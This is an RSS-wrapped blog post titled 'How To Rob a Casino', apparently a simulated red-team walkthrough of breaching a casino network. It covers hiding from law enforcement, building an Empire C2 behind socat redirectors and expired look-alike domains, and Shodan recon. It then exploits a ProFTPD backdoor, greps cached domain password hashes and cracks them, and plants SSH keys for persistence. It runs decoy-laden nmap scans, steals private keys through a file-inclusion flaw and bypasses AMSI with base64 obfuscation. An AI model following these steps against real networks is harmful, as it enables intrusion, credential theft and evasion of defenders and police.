<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>How To Rob a Casino</title>
    <link>https://0x00sec.org/t/how-to-rob-a-casino/40556</link>
    <description>Casinos, some view these places as something that corrupts the soul, leading individuals astray with the allure of easy money and instant gratification. Others see casinos as an escape from reality, seeking temporary relief from stress, boredom or dissatisfaction and for others it represents hope, offering the possibility of a better life through luck or skill.

But hackers?

An opportunity, a challenge, a game. Here we go again gentlemen Tropicana is back but this time besides the fact of saving your money, now it’s taking it as a gamble. This inspiration of a blog comes again from the Hacker Manifesto from Phineas Phisher [1] “bad guys”, the law, the “system” all trying to capture the “bad guy” who is stealing our money but is the bank here to protect us??[2].

But let’s forget about that, were here to Rob a casino, but ……. How do we do it? I’m no expert but I can recreate scenarios where it happened, replicate, and demonstrate some ideas on what tactics or techniques may or may not be used. Remember in the previous blog how we mentioned “Teach a man how to Phish” well it’s funny how the fish will be somewhat be involved [3].

Now I always try to demonstrate examples where people can have access and learn via Open Source tooling, in the last post on “How to Rob a Bank”[4] we worked with the Havoc[5] framework and amazing open source C2 that was built by a teenager trying to learn malware and that was working on it for 2 years before releasing it to us mortals. Please as mentioned previously don’t take this as a “Guide” a “How To” or a “Manual” because the infrastructures related to Casino’s, Banks, Treasury it’s quite different and here it’s just a simulation or is it?!?![6].

[1] https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt

[2] https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html

[3] https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/

[4] https://0x00sec.org/t/how-to-rob-a-bank/37022

[5] https://github.com/HavocFramework/Havoc

[6] [Morpheus explains what is real](https://www.youtube.com/watch?v=t-Nz6us7DUA)

—-[ Preparation ]———————————————————————————————————–

*“Give me six hours to chop down a tree and I will spend the first four sharpening the axe.”*

Building the infrastructure is an important part of handling your security, OPSEC and post-exploitation techniques that you will be working on once inside the network.

Security, staying safe on the internet is of upmost importance if you are going to hack a Casino right? I mean if the feds are knocking at your door that means you did something wrong already, but we don’t need to worry as we have some small tips for a strong infrastructure.

***VPN***

VPNs have some popularity that has been known to hackers already[1][2][3] in a bad or good way about these products, so do whatever you want with this information, now that we have the “PARENT” of all proxies and VPNs, we can consider the Tor Network but it also comes with some controversial problems [4][5] uncle Sam is always peeping and they can be creative as well.

But with all these things going on what can we do???

Piggyback onto another Wi-Fi maybe build a cantenna [6] and grab that Wi-Fi from a mile away or buy some remote access into already hacked devices and do your deeds there? But remember IP Logs! I am aware of proxies, but I am not familiar with how good they can be.

But here are some VPN that claim they don’t keep logs; these are suggestions as one would say just consider them and do some due diligence with your research.

***Virtualization and Encryption***

Run everything from a virtual machine there are multiple services available VMWare, VirtualBox, QEMU, Hypervisor [7][8][9][10] I’ve delved into this topic previously but still a good reminder, some of these VMs come with the ability to encrypt the Disks but there is no harm in manually applying another layer inside the VM.

[1] https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/

[2] https://surfshark.com/blog/can-police-track-vpn

[3] https://www.theregister.com/2011/09/26/hidemyass_lulzsec_controversy/

[4] https://gizmodo.com/fbi-tor-ip-address-muhammed-momtaz-al-azhari-isis-1849975153

[5] https://www.linkedin.com/pulse/fbi-can-track-locate-suspects-using-tor-still-secure-julian-wendt/

[6] https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/

[7] https://www.vmware.com/

[8] https://www.virtualbox.org/

[9] https://www.qemu.org/download/

[10] https://medium.com/@liam.cafearo/setting-up-hyper-v-and-a-kali-linux-virtual-machine-1a76bb4fa0f

—-[ Infrastructure ]————————————————————————————————————-

You managed to hide your tracks and think that you are in the clear that Big Brother is no longer watching your tracks, good!! But you need to build your infrastructure now, our server, redirectors and strong OPSEC so they don’t find you. Here are some “Tips and Tricks” to be careful.

The C2 Server

In this example will be using the Empire [1] C2 Framework, I know in the previous one I was working with Havoc, and as much of a fan I am I want to demonstrate that there is no “right” way of thinking don’t learn about the tool, learn about the technique that the tool takes advantage of. Maybe mimikatz for example grabs credentials from the LSASS process but is that it?! Is that the only place where there are passwords? Not really, Cookies, Files, Browsers they all contain that loot we are looking for, so that’s why I am working in using another C2 for this article, blog, whatever it’s considered to be.

*“To understand the technique.”*

I don’t want to get much into detail for installing and running empire but if you follow the wiki setup should be simple to install using an officially supported OS but in my case, I will be using a Docker[2] as Empire has no official support for BlackArchLinux, Dockers are a great way for temporary use, they can be created and destroyed in a breeze, when setting up your C2 we have to change it up a little, Ports, Headers, Obfuscation, the default settings are great but they are also well known, leave a new fingerprint every time you work these tools have been updated and modernized to use the latest techniques leaving stuff with the default settings nowadays is a great way to get you caught.

![|624x458](https://mydmcxblue.files.wordpress.com/2024/05/image-153.png?w=624)

Now we can’t just have our server facing the internet in default values you’ll get caught!![3] first will need some similar domains to the target as we are trying to blend in with our network traffic, to make sure it doesn’t look suspicious when we are moving inside the network or if we ever do phishing we will try to look the least suspicious as possible, C2s allow us to use something called Malleable[4] profiles to blend our traffic when our agent, beacon, demon calls back to us the traffic it uses is similar to common malicious connections so we have to make it look legitimate not simple connections where our commands and output can be easy to read from, a step into blending our traffic is finding legitimate expired domains[5] that we can use on our HTTP traffic.

![|423x231](https://mydmcxblue.files.wordpress.com/2024/05/image-154.png?w=423)

These examples were available to purchase maybe previous owners just didn’t have the need to continue with the domain. These domains are a good approach as Domain Categorization where AV/EDR or network product categorizes [6] a Domain to understand what’s it doing and what’s it meant for, so this is already done for you, but the process of aging still has to be looked on since registrations are shown as recent they were even if they are expired domains.

![|537x141](https://mydmcxblue.files.wordpress.com/2024/05/image-155.png?w=537)

Now that the domains are set for mixing our net traffic will need some relays, these work in the benefit of pointing our implants away from our server, if our server gets burned, we need to build it again and we don’t want to start all over again. Setting up relays is quite simple utilizing socat [7] with the following command:

```
socat -v TCP-LISTEN:4444,fork TCP:C2SERVER:4444
```

We listen on Port 4444 and relay all traffic to our server on the same port. We will verify this by setting up Wireshark to ensure our payload calls the relay instead of the real server. This way, if IP blocking is in place, our relay server will be flagged instead of our C2 server, and setting up a new relay is way faster than a new server.

![|624x338](https://mydmcxblue.files.wordpress.com/2024/05/image-156.png?w=624)

This is a simple redirector. There are legitimate services that can relay our connections and be more OPSEC about it [8][9][10]?? It’s just about being creative in this example all I am doing is just forwarding the TCP connections to my server.

You can notice on the screenshot that Wireshark only sees the IP Relay as the Destination but can’t see beyond that, so the server stays safe from prying eyes. Let’s add more layers of evasion into our infrastructure, another service for applying more security is Apache [11], Apache contains methods to Block IPs, allow only certain requests that contain certain values to have access onto our C2 Server.

—-[ Blocking IPs]—————————————————————————————————————-

Pretty simple locate your configuration file in the &lt;Directory Tag&gt; and place the IP or IP Range that you’d like to block.

![|247x104](https://mydmcxblue.files.wordpress.com/2024/05/image-157.png?w=247)

If I try to access the resource I get denied

![|624x143](https://mydmcxblue.files.wordpress.com/2024/05/image-158.png?w=624)

—-[ Custom Headers]———————————————————————————————————–

Now let’s remove it and try with specific values, let’s say Apache will only grant you access if there’s a specific Header in your request and if it doesn’t exist then it won’t allow you.

We will need to enable some modules that have been commented out:

LoadModule rewrite_module modules/mod_rewrite.so

LoadModule headers_module modules/mod_headers.so

From here will edit the &lt;Directory&gt; tag again placing the following values

![|486x144](https://mydmcxblue.files.wordpress.com/2024/05/image-159.png?w=486)

Requesting again to access the server with the specified Header will be the only way to gain access.

![|624x380](https://mydmcxblue.files.wordpress.com/2024/05/image-160.png?w=624)

Apache has numerous options and security layers that can be added to their configuration play around and check ideas on what can you do to strengthen your infrastructure.

[1] https://github.com/EmpireProject/Empire

[2] https://bc-security.gitbook.io/empire-wiki/quickstart/installation#docker

[3] https://twitter.com/MichalKoczwara/status/1657090134129401866

[4] https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

[5] https://www.expireddomains.net/

[6] https://urlfiltering.paloaltonetworks.com/query/

[7] https://linux.die.net/man/1/socat

[8] https://0xdarkvortex.dev/c2-infra-on-azure/

[9] https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/

[10] https://medium.com/trainingdock/http-redirects-with-lambda-c20cf7934060

[11] https://httpd.apache.org/

—-[ Recon ]———————————————————————————————————————–

Now recon has been the golden step for Red Teamers, Penetration Testers, APTs, Doctors, Scientists, you name it, this step is crucial for moving forward it helps you decide on what needs to be done next, the informed decisions you can take once you are on the network, maybe you don’t need to Privilege Escalate if your current users have the required permissions maybe Initial Access is our target but the information gathered on the version of Office that they are working with 2013, 2016, o365??. These files can hold valueable information that we can utilize for our External or Internal Enumeration, they contain tons of valueable data some of that data is called Metadata [1] looking at a file grabbed from the Casino’s website for a Job Posting demonstrates the user who created this file below.

![|561x189](https://mydmcxblue.files.wordpress.com/2024/05/image-161.png?w=561)

This information comes in handy when we are weaponizing our payloads to send to our target this method can be used if we were applying a password spraying technique or targeting specific users on the enterprise to avoid the issues of Spam make more rational and targeted phishing campaigns, as mentioned in the previous post “How to Rob a Bank, but in this scenario there is no need for Phishing since we found an IOT[2] (Internet Of Things) connected to the Internet, here will look at some resources to find some data that we can utilize when Enumerating externally.

What I like to do with this info now that I have a full name, sometimes you will get an internal username instead of a name like this one, but if that is not the case utilizing namemash.py [3] is a great method to build usernames to find the naming convention used internally

![|624x262](https://mydmcxblue.files.wordpress.com/2024/05/image-162.png?w=624)

We can avoid scanning ports and services by checking out other places that did this for us. For example, Shodan [4] a popular “HACKER” search engine, and well known for scanning the internet for open ports on IOTs, Shodan has an incredible API that we can utilize in the Command-Line Interface here is an example of finding information about hosts, such as IP, HOSTNAME, PORT AND SERVCE

```
shodan search --fields ip_str,port,org,hostnames &quot;Golden FTP&quot;
```

The results of this scan are quite impressive but hidden as I don’t want to show vulnerable or potential targets but in seen below, I’ve targeted port 21 to be specific where I know the FTP protocol and services are running a potential initial access vector since it can give me RCE or even anonymous file access.

![|624x387](https://mydmcxblue.files.wordpress.com/2024/05/image-163.png?w=624)

Now that we have located potential targets, we can now request a scan on the target we are interested in and gather a more detailed view on the information we are looking at.

![|546x252](https://mydmcxblue.files.wordpress.com/2024/05/image-164.png?w=546)

I do recommend verifying the Data manually if you can, since Shodan scans are just snapshots of when Shodan did the scan itself, once you proceed verifying this info yourself then it might yield you different results.

![|624x174](https://mydmcxblue.files.wordpress.com/2024/05/image-165.png?w=624)

Now I’ll be using some open source tooling built in the python language, I do recommend when working with Python tools to create a virtual environment this way you don’t break none of the other dependencies on your system and it’s a cleaner way to have an environment you can remove at any time, now I did not use this in the Shodan example because the tool was already pre-installed but a recommendation just in case you need to use something from GitHub

```
python3 -m venv python-environment

To access or start your virtual environment you would need the source command.

source python-environment/bin/activate
```

Now with that you will notice a new location set on your terminal path along with the username and hostname when this is all set and done, installing old or new python tools has been simplified with the safety of not forcing or breaking packages form your OS.

![|579x63](https://mydmcxblue.files.wordpress.com/2024/05/image-166.png?w=579)

I can run and install Spadefoot[5] without any issues inside the environment it would open a web page with the interface and options to start scanning our target be it a webpage or IP Address it’s a powerful tool for reconnaissance with options ranging in the passive to active scanning it will dive as deep as you allow it to for finding any valueable data related to our target the scanning is time consuming so research and look for other places while this is done and come back to at a later time

![|624x227](https://mydmcxblue.files.wordpress.com/2024/05/image-167.png?w=624)

Placing your tools in a virtual environment can be quite powerful and helpful to keep everything neatly organized and functional without the need to break your OS with all the extra unnecessary packages that one tool might require. I advise looking at the IoT Methodology [6] to have an idea on how to approach attacking stuff like this.

[1] https://en.wikipedia.org/wiki/Metadata#:~:text=Metadata%20means%20%22data%20about%20data,working%20with%20specific%20data%20easier.

[2] https://www.oracle.com/internet-of-things/what-is-iot/

[3] https://raw.githubusercontent.com/krlsio/python/main/namemash.py

[4] https://www.shodan.io/

[5] https://github.com/smicallef/spiderfoot

[6] https://github.com/inguardians/IoTA

—-[ Initial Access ]—————————————————————————————————————

In 2017, the most creative casino [1] breach occurred in the US. Rather than employing sophisticated techniques like 0-day exploits, phishing, or polymorphic self-encrypting malware, the attackers took a simpler route: they accessed a fish tank thermometer. This Linux-based thermometer, connected to the internet is part of the Internet of Things (IoT), it was linked to the same network hosting the casino’s internal infrastructure. IOTs are a great for deployment and have its conveniences for the user but they also have problems[2] IOTs to my experience are still a vast pool of the unknown but amazing individuals have jumped and started looking into these potentially broken devices, now for this example we won’t need to go that far since Metasploit[3] has the sufficient functions for us to gain Initial Access starting with a port scan will locate services with potential vulnerabilities that can allow use to gain access.

There are multiple tools that we can utilize to achieve our goals, some of them are actually combined with well-known ones such as rustscan[4] or custom ones written in your favorite language but here I will be using some methods just for verification and demonstration that sometimes all these tools won’t be available and creativity is what would help here, our first method is using the popular port scanner nmap[5] which needs no introduction as it’s the most popular well known pentester/redteam/blueteam tool known to man now take a look at the output below:

![|624x343](https://mydmcxblue.files.wordpress.com/2024/05/image-168.png?w=624)

Notice the detail of the scan, and the methods used such as the -sC (Safe Scripts) and -sV (Version) this information has been fingerprinted to be running on a OS: Ubuntu type but I want to show you this because we can’t just trust 1 tool or 1 method doesn’t matter how popular or useful it can be, always verify the information, QUESTION EVERYTHING[6] now another method I simply used the ncat tool to connect to a port, do some banner grabbing and confirm the port is actually open and reachable.

![|624x270](https://mydmcxblue.files.wordpress.com/2024/05/image-169.png?w=624)

I’ve confirmed that the ports are open, and I can interact with them so I can proceed with more enumeration and proceed with some vulnerability scanning and check the possibilities of exploits available where I can gain my first access.

Now a common methodology is to start looking for low hanging fruit, or the quick wins for these methods, will start in a simple order from top to bottom, normally this is not the approach taken with more professional pentesters as they can tell by experience, the ports that might give them those quick wins. In this example it’s port 21 to locate potential exploits with an offline tool named searchsploit [7] a great terminal alternative to exploitdb which allows you to quickly access workable exploits and documentation offline.

![|624x89](https://mydmcxblue.files.wordpress.com/2024/05/image-170.png?w=624)

I investigated this exploit by using the X flag. We can get more details about it if it’s available the info is usually inside the description of the exploit or sometimes, they contain a txt file that gives a more detailed description about the exploit.

![|621x202](https://mydmcxblue.files.wordpress.com/2024/05/image-171.png?w=621)

So there seems to be a backdoor on this version of ProFTPD, if we read the module from Metasploit we can find out the backdoor command sent to ProFTPD to gain a root shell.

![|354x42](https://mydmcxblue.files.wordpress.com/2024/05/image-172.png?w=354)

Great now I’ve gained Initial Access onto the Casino’s Internal Network

![|624x99](https://mydmcxblue.files.wordpress.com/2024/05/image-173.png?w=624)

Now that I finally have Initial Access onto the network it’s time to get into more hacking, getting around the systems, reach domain admin, dump some credz, evade some defenses, some tricks to reach our goal. Since enumeration is always key to decide what’s our next step onto the network let’s work with Ubuntu here for some AD (Active Directory) enumeration, it’s a little tricky since most tools are mostly written for Windows environments, some people are unaware that Ubuntu can be added [8] to the AD as well! But before continuing let’s upgrade [9] our shell to have a more stable terminal interaction.

![|440x126](https://mydmcxblue.files.wordpress.com/2024/05/image-174.png?w=440)

Perfect, moving forward should be a breeze, let’s check where we are and grab some info on the domain, locate some users, find any other computers on the AD a bunch to work on to reach our goal using the realm tool which is a tool needed to join an AD network with Ubuntu.

![|358x352](https://mydmcxblue.files.wordpress.com/2024/05/image-175.png?w=358)

Let’s check for any local users finding these can also give us an idea on how the workflow is worked on, local accounts are a common thing for when a workstation is being set up for the first time , back in my IT days we’d have 1 local master account to add the AD infrastructure and necessities but the local master account was never removed or even changed to give it less permissions!!!. But oh well what can you do ¯\_(ツ)_/¯

![|434x102](https://mydmcxblue.files.wordpress.com/2024/05/image-176.png?w=434)

![|87x26](https://mydmcxblue.files.wordpress.com/2024/05/image-177.png?w=87)

Only one local user, now the interesting part is to enumerate the Active Directory now, but since we don’t hold credentials for our a domain user and some methods and tools require credentials I’ll need to locate a potential user first by using the “w” command we can see if there are any active users on the machine that may give us an idea of the users that are available, the time they logged in, IDLE time and much more information this can also point out the naming convention of the internal AD users.

![|624x84](https://mydmcxblue.files.wordpress.com/2024/05/image-178.png?w=624)

Locating our first AD user with this helps us move forward now we can probably brute force usernames, locate more users, workstations and network connections to make sure that we can move laterally and if there’s an option to get around, but we need credentials since I don’t have much experience in locating hashes for the AD user in Ubuntu I had to do some research for this, in my scenario I found the hashes here:

```
grep -a &quot;cachedPassword&quot; /var/lib/sss/db/*
```

Using these hashes with hashcat we get a chance to crack these hashcat is a powerful tool for cracking passwords hashes with multiple options and features to help us achieve our goal of gaining cleartext credentials from a hash it’s simply a great tool to have in your arsenal, moving forward I used a command to lcoate me these hashes.

![|437x22](https://mydmcxblue.files.wordpress.com/2024/05/image-179.png?w=437)

Once located you can pass the hash onto hashcat and attempt to crack it, the password here was successfully cracked since it was a combination of Season + Year which is a common combination of weak passwords. Don’t be afraid of trying simple and well known credentials, they are still really common. I like to use rules as well, and you should be using rules since they mutate the words to find potential passwords such as Password -&gt; P@$$w0rd.

![|624x227](https://mydmcxblue.files.wordpress.com/2024/05/image-180.png?w=624)

To proceed in enumerating the AD we need some information about where the DC is located, you can run an nmap scan internally and try to find it by checking out your output, but this could be quite noisy, I used the adcli[10] command-line tool to get this information as it’s another tool that comes installed in Linux machines that were joined in a domain:

![|624x188](https://mydmcxblue.files.wordpress.com/2024/05/image-181.png?w=624)

Now the AD tools commonly use have been built for Windows environments but there are some great people out there that have built versions of these tools capable to run on Linux using python[11][12]but there are also built in tools in Linux that we can utilize such as LDAPSEARCH[13] the queries can be quite tricky and complicated to learn, so I do recommend testing these commands before running them to avoid crashing your shell and having a cheat sheet when you need to enumerate certain information on the domain

![|624x420](https://mydmcxblue.files.wordpress.com/2024/05/image-182.png?w=624)

On the screenshot above I enumerated the Domain Users seeing if I can find anything interesting such as finding passwords in the “Description Section” or users that belong to interesting groups, we can also look for SPN values that may allow us to use the Kerberoasting[14] attack and gain another users cleartext password but only experience will benefit us if we know some of the AD scenarios and techniques, if we are brand new to this only research will help us move forward. In the following screenshot I enumerated the available workstations

![|624x445](https://mydmcxblue.files.wordpress.com/2024/05/image-183.png?w=624)

In the above screenshot I am currently in the BCK-WKN1 workstation my goal is to move in this direction

```
BCK-WKN1 -&gt; BCK-WKN2 -&gt; GD-WKN1 -&gt; IT-WKN1
```

Now even though this output is great and all running tools on the host is kind of a “No, no” we may want to run a proxy onto the targeted workstation and run our custom tools with no issues of being detected in terms of local security products, since our tools are running in our controlled environment.

Before proceeding I should place persistence in case that my connection dies, the server reboots or any shenanigans since I am in a Linux machine my most comfortable course of action is to work with SSH by editing the configuration file I can allow it to use a private key for access instead of a password which I still don’t know, so on my attacker machine I should create a key:

```
ssh-keygen -t rsa -b 4096
```

When my key has been created, I can copy the id_rsa.pub key and copy its contents and place them in the remote workstation in a file named authorized_keys with that I can login using my private key that I’ve created on my attacking machine and login with a more stable terminal.

![|450x153](https://mydmcxblue.files.wordpress.com/2024/05/image-184.png?w=450)

And now I have a more stable and fully functional terminal, I’ve learned to work with this method if you’ve played HackTheBox in the past you will find familiar techniques or resources that I’ll point to so you can try them yourself, I try to live in Open Source as possible to show you that not everything is a complicated tool or technique.

![|624x321](https://mydmcxblue.files.wordpress.com/2024/05/image-185.png?w=624)

Now with persistence in place via SSH setting up a Dynamic Port Forwarding using the -D 9999 is my next step so I can pass my tools via proxy and gather information as I would from the remote host but this time not worrying about dependencies or other issues since they are pre-installed or fully functional from my host with pywerview [15] I gather Domain User information.

![|624x89](https://mydmcxblue.files.wordpress.com/2024/05/image-186.png?w=624)

I saved the output to JSON and beautified it using the jq [16] tool

![|624x588](https://mydmcxblue.files.wordpress.com/2024/05/image-187.png?w=624)

Searching for Domain Computers with pywerview should be quite simple and now I can focus on filtering out information I would like to gather, the project is quite interesting in the methods it uses for the information it queries, by utilizing LDAP to query this I would consider it a slightly more OPSEC friendly method to gather the information as other tools that use PowerShell or C# tend to use well known protocols and methods such as Windows APIs that’s why it’s a great skill to know you’re way around different Operating Systems

![|525x422](https://mydmcxblue.files.wordpress.com/2024/05/image-188.png?w=525)

For locating services and open ports running on computers in the internal network I will use the nmap port scanner to find potential attacks for moving laterally but I also want to consider the fact that I am being watched, nmap has great tools for spoofing, evasion and such that can help me scan these ports more quietly and still effective I targeted specific ports that I guessed should be opened on the network, here is the command I used:

![|624x181](https://mydmcxblue.files.wordpress.com/2024/05/image-189.png?w=624)

A brief explanation on the commands I used below, I didn’t use all the options but do play around and experiment:

![|624x235](https://mydmcxblue.files.wordpress.com/2024/05/image-190.png?w=624)

```
-------------------------[Nmap]----------------------------------------------------

-f: The -f option causes the requested scan (including host discovery scans) to use tiny, fragmented IP packets. The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect what you are doing.

--script-args http.userganet: This option helps me change the default value of the header used for nmap when it&#39;s scanning I can pass by as an iPhone, Windows, Printer, Android any device I want to blend in with the network traffic instead of just sending a big red flag that says &quot;Nmap Engine&quot;

--randomize-hosts: I don&#39;t want to scan in order since you can tell that something is going on, on the network because a scan is being done from top to bottom but if you can make it look random you have a better chance to blend in

-D: Decoys are sent to the network to try and spoof the source of where the real port scanning is coming from

Do play around there are other great options such as slow scanning, changing the fragmented packet sizes use a source port to show that the port is coming from a legitimate source like port 80, experiment.

-------------------------[Nmap]----------------------------------------------------
```

I’ve located my next move which is BCK-WKN2 it’s time to restart my enumeration and follow the process again, looking for low-hanging fruits, vulnerability scanning, exploitation and so on:

![|624x187](https://mydmcxblue.files.wordpress.com/2024/05/image-191.png?w=624)

Taking a quick look at port 80 since it has the most potential in terms of exploitation as internal web applications tend to be vulnerable to some serious exploits since they don’t have the development time for focusing on security, companies tend to ignore these facts just because “they aren’t facing the internet” but hey it’s good for us, a web application scanner I like to use as of lately is nuclei[17] a fast vulnerability scanner designed to probe modern applications, infrastructure, cloud platforms, and networks, aiding in the identification and mitigation of exploitable vulnerabilities, powerful tool that can be customized and add even more custom attacks, the templates are based on YAML so some work to get used to. The scan shown below demonstrates an LFI[18] vulnerability

![|624x196](https://mydmcxblue.files.wordpress.com/2024/05/image-192.png?w=624)

[! WARNING]

Do be careful with using scanners on internal networks the default settings are usually running at high speeds sending multiple requests per second, if not careful you can crash the application and give yourself away.

![|624x155](https://mydmcxblue.files.wordpress.com/2024/05/image-193.png?w=624)

Let’s look at the website and test this vulnerability manually we can use the web browser or do a simple curl command with the example given by nuclei.

![|624x293](https://mydmcxblue.files.wordpress.com/2024/05/image-194.png?w=624)

![|624x196](https://mydmcxblue.files.wordpress.com/2024/05/image-195.png?w=624)

Seen above, notice the output from curl we can read files on the remote workstation, this gives us some potential stuff to look at and gain some access to the remote workstation.

[1] https://cyberhound.com/the-great-fish-tank-hack/

[2] https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/

[3] https://www.metasploit.com/

[4] https://github.com/RustScan/RustScan

[5] https://nmap.org/

[6] https://www.psychologytoday.com/us/blog/connect-creativity/201311/question-everything-everywhere-forever

[7] https://www.exploit-db.com/searchsploit

[8] https://www.informaticar.net/join-ubuntu-22-04-to-microsoft-active-directory-domain/

[9] https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

[10] https://manpages.ubuntu.com/manpages/trusty/man8/adcli.8.html

[11] https://github.com/the-useless-one/pywerview

[12] https://github.com/SecuProject/ADenum?tab=readme-ov-file

[13] https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html

[14] https://www.crowdstrike.com/cybersecurity-101/kerberoasting/

[15] https://github.com/the-useless-one/pywerview

[16] https://jqlang.github.io/jq/

[17] https://docs.projectdiscovery.io/tools/nuclei/overview

[18] https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

—-[ Deeper in the Network ]————————————————————————————————–

With LFI as our potential lateral movement technique to move deeper onto the network we have to use this in our advantage to gain access to the remote host, now remember previously the SSH port, this tells us as attackers that there is an SSH server running and probably a potential way to access this host, with our previous enumeration using pywerview I can grab a list of domain users and start brute forcing for interesting files in their home directory folders since we are aware that SSH is running I’ll start looking for SSH related files, I do want to mention another potential tool for this is netexec[1] with multiple protocols and modules available for us to work with, we could potentially locate different paths to gain access or maybe just simple enumeration as seen below where I grab usernames:

![|624x137](https://mydmcxblue.files.wordpress.com/2024/05/image-196.png?w=624)

Now with this user list I’ll build a small pythons script to locate interesting files like public, or private SSH keys which we will find using this vulnerability it’s a valuable skill to try and automate some things by utilizing languages such as python or scripting languages such as BASH using the tools manually is great as well but if you really want to make your life easy when hacking or trying to reach the same spot again automation is the recommended way, now below we see the script at work

![|624x578](https://mydmcxblue.files.wordpress.com/2024/05/image-197.png?w=624)

With jnovoa’s private SSH key I use it to login onto the workstation these SSH connections if set up with default values they give the user Administrator Privileges onto the workstation, of course this only applied if the user is in the local Administrator group

![|624x127](https://mydmcxblue.files.wordpress.com/2024/05/image-198.png?w=624)

Now that we are currently in this windows workstation we can move onto utilizing our C2 framework for a more dedicated attack using a payload with all our tools loaded we do have to be careful to edit and customize this as much as possible to leave a different fingerprint than the already known ones from Empire for example take a look at the following payload, you will notice a detection but not based on signature but behavior since detection’s are commonly done via static, behavior and heuristics we do have to consider what is being detected and why:

![|624x430](https://mydmcxblue.files.wordpress.com/2024/05/image-199.png?w=624)

Since the method of behavior was at fault, I do want to apply some evasions that can aid in avoiding detection’s when I am trying my PowerShell agents, especially since they come in a command-line method where I need to copy and paste the command onto the terminal my first approach is trying to avoid any static detection’s in this case it’s AMSI.

Now since I am running purely with PowerShell, I like to use some tools for AMSI String detection most of these bypass work by obfuscating strings that trigger AMSI when running here is a simple example of this behavior or method of detection quite simple and yet effective to understand some AV products.

![|624x108](https://mydmcxblue.files.wordpress.com/2024/05/image-200.png?w=624)

Literally just a word and received a flag by Defender and AMSI telling me this is malicious but if we apply some slight obfuscation, I can use the word with no warnings whatsoever:

![|501x96](https://mydmcxblue.files.wordpress.com/2024/05/image-201.png?w=501)

Now we want to apply a “patch” to AMSI to avoid these triggers, the way this works is that if we can tell AMSI that all the strings being passed to it are Benign then everything will be ignored by AMSI, the patch I’ll be working with is one by Adam Chester[2] so here is the patch[3] but of course this out the box is going to get flagged so I like to test it with AMSITRIGGER[4]

![|381x135](https://mydmcxblue.files.wordpress.com/2024/05/image-202.png?w=381)

Looking at this output seems that the bad word here is AMSI now the file is using C# embedded in a PowerShell script since PowerShell can interact with the CLR which runs C# I can actually use obfuscation techniques meant for C# so now I will base64 this string and decode it on the fly.

![|624x16](https://mydmcxblue.files.wordpress.com/2024/05/image-203.png?w=624)

![|422x126](https://mydmcxblue.files.wordpress.com/2024/05/image-213.png?w=422)

Now with the method above I utilized a Base64 Decoding method native to C# and encoded the malicious string, this time now the file is flagged as malicious but executing still causes problems:

![|624x388](https://mydmcxblue.files.wordpress.com/2024/05/image-214.png?w=624)

The cat and mouse game, now all the tools even Defender tells me it’s ok but remember since there is no execution Defender can’t check or analyze it via behavior so this will need to execute to give it a different type of scanning method, since this is the theory I’m working on, one method I like to try instead of running the script using IEX and such I like to copy/paste the entire script since I would like to think that Defender is thinking that these are just regular commands run by a user but it’s me guessing that, that’s what’s going on, this is only possible because I have a full terminal that I can access and paste these commands onto the terminal:

![|624x77](https://mydmcxblue.files.wordpress.com/2024/05/image-215.png?w=624)

Now this time the malicious strings are no longer being flagged but errors are now shown this is good as it means that any malicious word doesn’t kill my payload or cause a detection, PowerShell just thinks it’s a functions or some sort of operable program to execute. Now from here we can move on and capture our first working agent from Empire:

![|624x238](https://mydmcxblue.files.wordpress.com/2024/05/image-216.png?w=624)

Now here I’ve shown how to avoid the static string detection, but we were talking about behavior based, since this scenario requires a lot of tinkering all I can give here is advise on what one can do for evading these detection’s I’ll explain some of these in parts

![|624x47](https://mydmcxblue.files.wordpress.com/2024/05/image-217.png?w=624)

The Malleable profile is the network traffic that will be used to spoof and blend in our C2 to agent communication this needs to make sense in a way we don’t want to give ourselves away by using strange traffic like a bogus website that just go up and running and it just so happens to communicate inside this network only.

![|624x48](https://mydmcxblue.files.wordpress.com/2024/05/image-218.png?w=624)

If possible use Certificates for your traffic this makes it look more legitimate in current times https traffic uses certs to encrypt the network traffic this helps in the case of making it look like legitimate https traffic just because of the simple fact that it is signed, the cert can be self-signed and still be ignored in some cases.

![|624x50](https://mydmcxblue.files.wordpress.com/2024/05/image-219.png?w=624)

The working hours is a setting that avoids your agent to speak out to your C2 server when you aren’t even on it yourself, that way you can avoid weird network requests at odd hours of work. Mostly these configurations come within Empire itself but the profile [5] can accept custom settings as well.

![|244x102](https://mydmcxblue.files.wordpress.com/2024/05/image-220.png?w=244)

The spawning process, the sleep time, the jitter, the pipe names used for SMB listeners and more diving deeper into the profiles will help you avoid detection’s as well, play with them and try some creative stuff on your own [6][7].

Perfect now from here we can start grabbing more info, look for potential passwords, interesting files, the whole 9 yards to grab as much as possible from the host, now some things I personally like to take a look at are processes and the security product we are going up against, Empire has modules that can be utilized to execute in memory from the current or any live agents that we have for example the antivirus module to locate the security product running:

![|624x453](https://mydmcxblue.files.wordpress.com/2024/05/image-221.png?w=624)

And the output is as follows:

![|624x209](https://mydmcxblue.files.wordpress.com/2024/05/image-222.png?w=624)

I just ran this to verify other security products weren’t on the host, but since my payloads worked It is highly unlikely that was the case because if it were EDR or some other layer of security getting around it would have been trickier.

I want to also take some time to look for interesting files, processes anything that might give me an idea on what’s going on the network Empire has useful modules for this type of approach a built in SauronEye module an interesting C# tool built for fast searches built into Empire utilizing PowerShell

![|624x475](https://mydmcxblue.files.wordpress.com/2024/05/image-223.png?w=624)

I do however disable the search file contents as this will take more time and resources, also this would be noisy when something trying to read files at a high speed but once that is settled I can check the files manually by downloading them individually.

![|624x301](https://mydmcxblue.files.wordpress.com/2024/05/image-224.png?w=624)

